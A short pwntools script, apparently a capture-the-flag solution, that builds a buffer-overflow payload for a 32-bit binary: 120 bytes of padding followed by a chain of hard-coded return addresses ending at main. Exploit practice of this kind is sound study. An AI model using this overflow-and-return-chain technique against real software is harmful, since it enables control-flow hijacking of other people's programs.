import pwn
from pwn.toplevel import p32

pwn.context.arch = 'i386'

A = "\x9d\x12\x04\x08"  #pwn.p32(0x0804129d, 'little')
B = "\xcf\x12\x04\x08"  #pwn.p32(0x080412cf, 'little')
C = "\x01\x13\x04\x08"  #pwn.p32(0x08041301, 'little')
D = "\x33\x13\x04\x08"  #pwn.p32(0x08041333, 'little')
E = "\x65\x13\x04\x08"  #pwn.p32(0x08041365, 'little')
F = "\x97\x13\x04\x08"  #pwn.p32(0x08041397, 'little')
G = "\xc9\x13\x04\x08"  #pwn.p32(0x080413c9, 'little')
main = "\xfc\x14\x04\x08" 

gadgets = A+B+C+D+E+F+G+main
pl = '77\n' + ('A' * 120) + gadgets
print(pl)

#p = pwn.process('/p')



